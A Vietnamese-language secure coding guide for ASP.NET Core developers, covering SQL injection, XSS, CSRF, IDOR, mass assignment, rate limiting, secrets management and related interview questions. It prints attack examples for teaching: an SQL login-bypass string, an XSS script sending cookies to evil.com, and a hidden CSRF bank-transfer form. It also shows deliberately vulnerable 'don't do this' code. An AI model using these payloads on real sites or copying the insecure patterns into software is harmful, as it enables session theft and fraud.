# Secure Coding Practices — Thực Hành Lập Trình An Toàn

> Secure coding — lập trình an toàn — là tập hợp thực hành giúp ngăn chặn các lỗ hổng bảo mật phổ biến. Đây là nền tảng bảo mật ứng dụng, không thể thay thế bằng các lớp bảo vệ bên ngoài.

---

## 1. SQL Injection — Tấn Công Tiêm SQL

SQL Injection là cuộc tấn công trong đó kẻ tấn công chèn SQL độc hại vào query thông qua input người dùng.

### Tấn Công

```sql
-- Đây là input của user
username = "admin' OR '1'='1"
password = "anything"

-- Query kết quả (NGUY HIỂM)
SELECT * FROM Users
WHERE Username = 'admin' OR '1'='1'  -- Luôn đúng!
  AND Password = 'anything'

-- Kẻ tấn công đã đăng nhập mà không cần mật khẩu!
```

### Phòng Chống — Parameterized Queries

```csharp
// ❌ TUYỆT ĐỐI KHÔNG làm — String concatenation
var query = $"SELECT * FROM Users WHERE Username = '{username}' AND Password = '{password}'";
using var cmd = new SqlCommand(query, connection);

// ✅ Luôn dùng Parameterized Queries
using var cmd = new SqlCommand(
    "SELECT * FROM Users WHERE Username = @username AND Password = @password",
    connection);
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@password", password);

// ✅ Với Dapper — Tự động parameterize
var user = await connection.QueryFirstOrDefaultAsync<User>(
    "SELECT * FROM Users WHERE Username = @Username AND Password = @Password",
    new { Username = username, Password = password });  // Object, không phải string

// ✅ Với EF Core — Tự động safe
var user = await dbContext.Users
    .Where(u => u.Username == username && u.Password == hashedPassword)
    .FirstOrDefaultAsync();
// EF Core tự generate parameterized SQL

// ✅ Nếu cần raw SQL trong EF Core
var user = await dbContext.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Username = {username}")
    .FirstOrDefaultAsync();
// FromSqlInterpolated tự động parameterize interpolated values

// ❌ FromSqlRaw với concatenation — vẫn nguy hiểm
var user = await dbContext.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Username = '{username}'")
    .FirstOrDefaultAsync();
```

---

## 2. XSS — Cross-Site Scripting — Tấn Công Script Chéo Trang

XSS là cuộc tấn công trong đó kẻ tấn công chèn JavaScript độc hại vào trang web, thực thi trong browser của nạn nhân.

### Ba Loại XSS

```
Stored XSS (Persistent):              Reflected XSS:
  - Script lưu trong database            - Script trong URL parameter
  - Chạy khi user load trang             - Link độc hại gửi qua email
  - Nguy hiểm nhất                       - User bị lừa click link

  DOM-based XSS:
  - Script thao túng DOM trực tiếp
  - Không đi qua server
```

### Tấn Công

```javascript
// Kẻ tấn công post comment:
// <script>document.location='https://evil.com/steal?c='+document.cookie</script>

// Khi user load trang và comment được render:
// → Cookie bị gửi đến evil.com
// → Kẻ tấn công có thể chiếm session
```

### Phòng Chống

```csharp
// ✅ Razor tự động HTML encode (mặc định an toàn)
@Model.UserInput  // Razor encode: <script> → &lt;script&gt;

// ❌ @Html.Raw không encode — chỉ dùng với dữ liệu tin cậy
@Html.Raw(Model.TrustedHtmlContent)

// ✅ Trong API responses — .NET tự encode JSON
// "<script>" → "\u003cscript\u003e" trong JSON (mặc định)

// ✅ Content Security Policy — ngăn inline scripts
// Xem 6-https-and-tls.md → Security Headers section

// ✅ Encode output theo context
using Microsoft.AspNetCore.WebUtilities;

var htmlEncoded = HtmlEncoder.Default.Encode(userInput);     // HTML context
var urlEncoded = UrlEncoder.Default.Encode(userInput);       // URL context
var jsEncoded = JavaScriptEncoder.Default.Encode(userInput); // JavaScript context

// ✅ Sanitize HTML nếu cần cho phép formatting (dùng library)
// HtmlSanitizer — whitelist approach
dotnet add package HtmlSanitizer

var sanitizer = new HtmlSanitizer();
var safeHtml = sanitizer.Sanitize(userInput);
```

---

## 3. CSRF — Cross-Site Request Forgery — Tấn Công Giả Mạo Yêu Cầu Chéo Trang

CSRF xảy ra khi website độc hại lừa browser người dùng gửi request đến website khác mà người dùng đang đăng nhập.

### Tấn Công

```html
<!-- Trang web độc hại: evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">
<!-- Browser tự động gửi request kèm cookie của bank.com -->

<!-- Hoặc form tự submit -->
<form action="https://bank.com/transfer" method="POST" id="hack">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
```

### Phòng Chống trong ASP.NET Core

```csharp
// ✅ Cách 1: Anti-Forgery Token (Razor Forms — tự động)
// Razor tự thêm anti-forgery token khi dùng tag helpers
<form asp-controller="Transfer" asp-action="Send" method="post">
    <!-- Razor tự thêm: <input name="__RequestVerificationToken" value="..."> -->
    <button type="submit">Chuyển tiền</button>
</form>

// Controller kiểm tra token
[HttpPost]
[ValidateAntiForgeryToken]  // Tự động validate
public IActionResult Send(TransferModel model) { }

// ✅ Cách 2: SameSite Cookie Attribute (Hiện đại nhất)
builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.Cookie.SameSite = SameSiteMode.Strict;  // Hoặc Lax
        // Strict: Cookie không gửi trong mọi cross-site request
        // Lax: Cookie không gửi trong cross-site POST (nhưng gửi trong GET navigation)
        options.Cookie.HttpOnly = true;
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    });

// ✅ Cách 3: CSRF Token cho API (JavaScript SPA)
// ASP.NET Core Antiforgery với custom header
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";  // Header name cho AJAX
});

// Endpoint trả về token
app.MapGet("/antiforgery/token", (IAntiforgery antiforgery, HttpContext httpContext) =>
{
    var tokens = antiforgery.GetAndStoreTokens(httpContext);
    return Results.Ok(new { token = tokens.RequestToken });
});

// Frontend gửi token trong header
// fetch('/api/transfer', {
//   method: 'POST',
//   headers: { 'X-CSRF-TOKEN': csrfToken },
//   body: JSON.stringify(data)
// });
```

> 💡 **JWT + Authorization Header không bị CSRF** vì browser không tự động gửi Authorization header — chỉ cookies mới tự động gửi.

---

## 4. Input Validation — Xác Thực Dữ Liệu Đầu Vào

```csharp
// ✅ Data Annotations
public class CreateUserRequest
{
    [Required(ErrorMessage = "Email là bắt buộc")]
    [EmailAddress(ErrorMessage = "Email không đúng định dạng")]
    [MaxLength(256)]
    public string Email { get; set; } = string.Empty;

    [Required]
    [MinLength(8, ErrorMessage = "Mật khẩu tối thiểu 8 ký tự")]
    [MaxLength(128)]
    [RegularExpression(@"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$",
        ErrorMessage = "Mật khẩu phải có chữ hoa, thường và số")]
    public string Password { get; set; } = string.Empty;

    [Range(0, 150, ErrorMessage = "Tuổi phải từ 0 đến 150")]
    public int Age { get; set; }

    [Url]
    public string? Website { get; set; }
}

// ✅ FluentValidation — Phức tạp hơn
public class CreateUserValidator : AbstractValidator<CreateUserRequest>
{
    public CreateUserValidator()
    {
        RuleFor(x => x.Email)
            .NotEmpty().WithMessage("Email là bắt buộc")
            .EmailAddress().WithMessage("Email không hợp lệ")
            .MaximumLength(256);

        RuleFor(x => x.Password)
            .NotEmpty()
            .MinimumLength(8)
            .Matches("[A-Z]").WithMessage("Phải có ít nhất 1 chữ hoa")
            .Matches("[0-9]").WithMessage("Phải có ít nhất 1 chữ số")
            .Matches("[^a-zA-Z0-9]").WithMessage("Phải có ít nhất 1 ký tự đặc biệt");

        RuleFor(x => x.Age)
            .InclusiveBetween(0, 150);
    }
}

// ✅ Validate file upload
[HttpPost("upload")]
public async Task<IActionResult> Upload(IFormFile file)
{
    // Validate type bằng magic bytes (không tin content-type header)
    var allowedSignatures = new Dictionary<string, List<byte[]>>
    {
        { ".jpg", new List<byte[]> { new byte[] { 0xFF, 0xD8, 0xFF } } },
        { ".png", new List<byte[]> { new byte[] { 0x89, 0x50, 0x4E, 0x47 } } },
        { ".pdf", new List<byte[]> { new byte[] { 0x25, 0x50, 0x44, 0x46 } } }
    };

    var extension = Path.GetExtension(file.FileName).ToLowerInvariant();
    if (!allowedSignatures.ContainsKey(extension))
        return BadRequest("Loại file không được phép");

    // Đọc magic bytes
    using var reader = new BinaryReader(file.OpenReadStream());
    var headerBytes = reader.ReadBytes(8);
    var isValidSignature = allowedSignatures[extension]
        .Any(sig => headerBytes.Take(sig.Length).SequenceEqual(sig));

    if (!isValidSignature)
        return BadRequest("Nội dung file không khớp phần mở rộng");

    // Giới hạn kích thước
    const long maxSize = 10 * 1024 * 1024;  // 10MB
    if (file.Length > maxSize)
        return BadRequest("File quá lớn (tối đa 10MB)");

    // Lưu với tên file mới (không dùng tên gốc từ user)
    var safeFileName = $"{Guid.NewGuid()}{extension}";
    var uploadPath = Path.Combine("uploads", safeFileName);

    await using var stream = System.IO.File.Create(uploadPath);
    await file.CopyToAsync(stream);

    return Ok(new { fileName = safeFileName });
}
```

---

## 5. Sensitive Data Exposure — Lộ Thông Tin Nhạy Cảm

```csharp
// ❌ Expose stack trace trong response
// Program.cs — KHÔNG để ở production
app.UseDeveloperExceptionPage();  // Chỉ dùng development!

// ✅ Error handling đúng cách
app.UseExceptionHandler(errorApp =>
{
    errorApp.Run(async context =>
    {
        context.Response.StatusCode = 500;
        context.Response.ContentType = "application/json";

        var error = context.Features.Get<IExceptionHandlerFeature>();
        if (error != null)
        {
            // Log đầy đủ cho developer
            var logger = context.RequestServices
                .GetRequiredService<ILogger<Program>>();
            logger.LogError(error.Error, "Unhandled exception");

            // Trả về message chung cho client (không leak chi tiết)
            await context.Response.WriteAsJsonAsync(new
            {
                error = "Đã xảy ra lỗi. Vui lòng thử lại sau.",
                traceId = context.TraceIdentifier  // Để support team lookup
            });
        }
    });
});

// ❌ Không log thông tin nhạy cảm
logger.LogInformation("User {Email} đăng nhập với mật khẩu {Password}", email, password);

// ✅ Log đúng cách
logger.LogInformation("User {Email} đăng nhập thành công", email);

// ❌ Không trả về password trong response
return Ok(new { user.Id, user.Email, user.PasswordHash });  // KHÔNG!

// ✅ Dùng DTO để kiểm soát dữ liệu trả về
return Ok(new UserDto { Id = user.Id, Email = user.Email, Name = user.FullName });
```

---

## 6. Mass Assignment — Gán Hàng Loạt Không An Toàn

```csharp
// ❌ Nguy hiểm — User có thể gửi { role: "Admin", isVerified: true }
[HttpPut("{id}")]
public async Task<IActionResult> UpdateUser(string id, [FromBody] ApplicationUser user)
{
    // Nếu bind trực tiếp từ request → user có thể tự set role!
    await _userManager.UpdateAsync(user);
}

// ✅ Dùng DTO (Data Transfer Object) để chỉ bind fields được phép
public class UpdateProfileRequest
{
    public string? FullName { get; set; }
    public string? AvatarUrl { get; set; }
    // Không có: Role, IsActive, IsVerified, PasswordHash, ...
}

[HttpPut("profile")]
[Authorize]
public async Task<IActionResult> UpdateProfile([FromBody] UpdateProfileRequest request)
{
    var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
    var user = await _userManager.FindByIdAsync(userId!);
    if (user == null) return NotFound();

    // Chỉ cập nhật các fields được phép
    if (request.FullName != null) user.FullName = request.FullName;
    if (request.AvatarUrl != null) user.AvatarUrl = request.AvatarUrl;

    await _userManager.UpdateAsync(user);
    return NoContent();
}
```

---

## 7. Insecure Direct Object Reference — IDOR — Tham Chiếu Đối Tượng Trực Tiếp Không An Toàn

```csharp
// ❌ IDOR — User A có thể xem dữ liệu của User B
[Authorize]
[HttpGet("orders/{orderId}")]
public async Task<IActionResult> GetOrder(int orderId)
{
    var order = await _orderRepo.GetByIdAsync(orderId);
    if (order == null) return NotFound();
    return Ok(order);  // Không kiểm tra order thuộc về user hiện tại!
}

// ✅ Luôn kiểm tra ownership — quyền sở hữu
[Authorize]
[HttpGet("orders/{orderId}")]
public async Task<IActionResult> GetOrder(int orderId)
{
    var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
    var order = await _orderRepo.GetByIdAsync(orderId);

    if (order == null) return NotFound();

    // Kiểm tra order thuộc về user hiện tại (hoặc là Admin)
    if (order.UserId != userId && !User.IsInRole("Admin"))
        return Forbid();  // 403, không phải 404 — để tránh enumeration attack

    return Ok(order);
}

// ✅ Còn tốt hơn: Truyền userId vào query ngay từ đầu
[Authorize]
[HttpGet("orders/{orderId}")]
public async Task<IActionResult> GetOrder(int orderId)
{
    var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);

    // Query đã có filter userId → không thể truy cập order của người khác
    var order = await _orderRepo.GetByIdForUserAsync(orderId, userId!);
    if (order == null) return NotFound();

    return Ok(order);
}
```

---

## 8. Rate Limiting — Giới Hạn Tần Suất Yêu Cầu

```csharp
// .NET 7+ có built-in Rate Limiting
builder.Services.AddRateLimiter(options =>
{
    // Global rate limit
    options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(context =>
    {
        return RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: context.User?.Identity?.Name ?? context.Request.Headers.Host.ToString(),
            factory: partition => new FixedWindowRateLimiterOptions
            {
                AutoReplenishment = true,
                PermitLimit = 100,
                Window = TimeSpan.FromMinutes(1)
            });
    });

    // Rate limit riêng cho login endpoint
    options.AddFixedWindowLimiter("LoginPolicy", options =>
    {
        options.PermitLimit = 5;           // 5 lần
        options.Window = TimeSpan.FromMinutes(15);  // mỗi 15 phút
        options.QueueProcessingOrder = QueueProcessingOrder.OldestFirst;
        options.QueueLimit = 0;            // Không queue, từ chối ngay
    });

    options.OnRejected = async (context, token) =>
    {
        context.HttpContext.Response.StatusCode = 429;  // Too Many Requests
        await context.HttpContext.Response.WriteAsJsonAsync(new
        {
            error = "Quá nhiều yêu cầu. Vui lòng thử lại sau."
        }, token);
    };
});

app.UseRateLimiter();

// Áp dụng cho endpoint cụ thể
app.MapPost("/auth/login", LoginHandler)
    .RequireRateLimiting("LoginPolicy");
```

---

## 9. Secrets Management — Quản Lý Bí Mật

```csharp
// ❌ KHÔNG hardcode secrets trong code
var connectionString = "Server=prod-db;Database=MyDb;Password=SuperSecret123!";
var jwtSecret = "my-jwt-secret-key";

// ✅ Development — User Secrets (chỉ trên máy local)
// dotnet user-secrets set "Jwt:SecretKey" "dev-secret-key"
// Lưu trong: %APPDATA%\Microsoft\UserSecrets\<UserSecretsId>\secrets.json

// ✅ Production — Environment Variables
// ASPNETCORE_Jwt__SecretKey=prod-secret-key
var secretKey = builder.Configuration["Jwt:SecretKey"];

// ✅ Production — Azure Key Vault (tốt nhất)
builder.Configuration.AddAzureKeyVault(
    new Uri($"https://{keyVaultName}.vault.azure.net/"),
    new DefaultAzureCredential());  // Managed Identity — không cần password!

// Đọc secret
var secretKey = builder.Configuration["JwtSecretKey"];  // Key Vault tự map

// ✅ Kiểm tra configuration khi startup
builder.Services.AddOptions<JwtSettings>()
    .Bind(builder.Configuration.GetSection("Jwt"))
    .ValidateDataAnnotations()          // Validate required fields
    .ValidateOnStart();                 // Fail fast nếu thiếu config

public class JwtSettings
{
    [Required]
    [MinLength(32)]
    public string SecretKey { get; set; } = string.Empty;

    [Required]
    public string Issuer { get; set; } = string.Empty;
}
```

---

## 10. Security Logging — Ghi Log Bảo Mật

```csharp
// Những sự kiện cần log
public class SecurityAuditService
{
    private readonly ILogger<SecurityAuditService> _logger;

    public void LogFailedLogin(string email, string ipAddress)
    {
        _logger.LogWarning("Failed login attempt. Email: {Email}, IP: {IpAddress}, Time: {Time}",
            email, ipAddress, DateTime.UtcNow);
    }

    public void LogSuccessfulLogin(string userId, string ipAddress)
    {
        _logger.LogInformation("Successful login. UserId: {UserId}, IP: {IpAddress}",
            userId, ipAddress);
    }

    public void LogUnauthorizedAccess(string userId, string resource)
    {
        _logger.LogWarning("Unauthorized access attempt. UserId: {UserId}, Resource: {Resource}",
            userId, resource);
    }

    public void LogPasswordChanged(string userId)
    {
        _logger.LogInformation("Password changed. UserId: {UserId}", userId);
    }

    public void LogSuspiciousActivity(string description, object? data = null)
    {
        _logger.LogWarning("Suspicious activity detected. Description: {Description}, Data: {@Data}",
            description, data);
    }
}

// ❌ KHÔNG log sensitive data
_logger.LogInformation("Password: {Password}", password);          // KHÔNG
_logger.LogInformation("Token: {Token}", jwtToken);                // KHÔNG
_logger.LogInformation("CardNumber: {Card}", creditCardNumber);    // KHÔNG
```

---

## 11. Dependency Security — Bảo Mật Thư Viện

```bash
# Kiểm tra NuGet packages có lỗ hổng bảo mật
dotnet list package --vulnerable

# Update packages
dotnet outdated  # Cần cài tool: dotnet tool install -g dotnet-outdated-tool

# Audit tự động trong CI/CD
dotnet list package --vulnerable --include-transitive
```

---

## 12. Câu Hỏi Phỏng Vấn

**Q: Sự khác nhau giữa XSS và CSRF?**

```
XSS — Cross-Site Scripting:
  - Kẻ tấn công inject code VÀO website target
  - Code chạy trong browser của nạn nhân khi họ thăm site đó
  - Mục tiêu: Đánh cắp cookies, hijack session, phishing
  - Phòng: HTML encoding, CSP, HttpOnly cookies

CSRF — Cross-Site Request Forgery:
  - Kẻ tấn công TẠO request GIẢ từ browser nạn nhân
  - Nạn nhân phải đã đăng nhập vào target site
  - Mục tiêu: Thực hiện hành động thay mặt nạn nhân
  - Phòng: CSRF tokens, SameSite cookies, custom headers
```

**Q: Tại sao JWT không bị CSRF?**

```
CSRF hoạt động vì browser TỰ ĐỘNG gửi cookies với mọi request.
JWT lưu trong localStorage/memory → browser KHÔNG tự gửi.
→ Kẻ tấn công cần JavaScript để lấy JWT → chỉ có XSS mới làm được.

Tuy nhiên nếu JWT lưu trong Cookie → bị CSRF!
→ Nếu lưu trong cookie: dùng SameSite=Strict hoặc CSRF token
```

---

## ✅ Checklist Secure Coding

```
Input Validation
  ✅ Validate tất cả input (server-side, không chỉ client-side)
  ✅ Parameterized queries cho mọi database operations
  ✅ File upload: validate type, size, scan content
  ✅ Dùng DTO để tránh mass assignment

Output Encoding
  ✅ HTML encode output trong views
  ✅ Content Security Policy header
  ✅ Không dùng @Html.Raw với user data

Authentication & Session
  ✅ HttpOnly + Secure + SameSite cookies
  ✅ CSRF tokens cho form submissions
  ✅ Rate limiting cho login endpoint
  ✅ Account lockout sau nhiều lần thất bại

Authorization
  ✅ Kiểm tra ownership cho mọi resource access
  ✅ Principle of least privilege
  ✅ [Authorize] trên mọi endpoint nhạy cảm

Secrets & Configuration
  ✅ Không hardcode secrets
  ✅ Azure Key Vault hoặc environment variables
  ✅ Rotate secrets định kỳ
  ✅ Không log sensitive data

Error Handling
  ✅ Custom error pages, không expose stack trace
  ✅ Log đầy đủ cho internal (không log password/token)
  ✅ Trả về message chung cho client

Dependencies
  ✅ Audit NuGet packages định kỳ
  ✅ Update packages có lỗ hổng bảo mật
  ✅ CI/CD pipeline check vulnerabilities
```

---

**Quay Lại:** [README.md](README.md) — Tổng Quan Bảo Mật
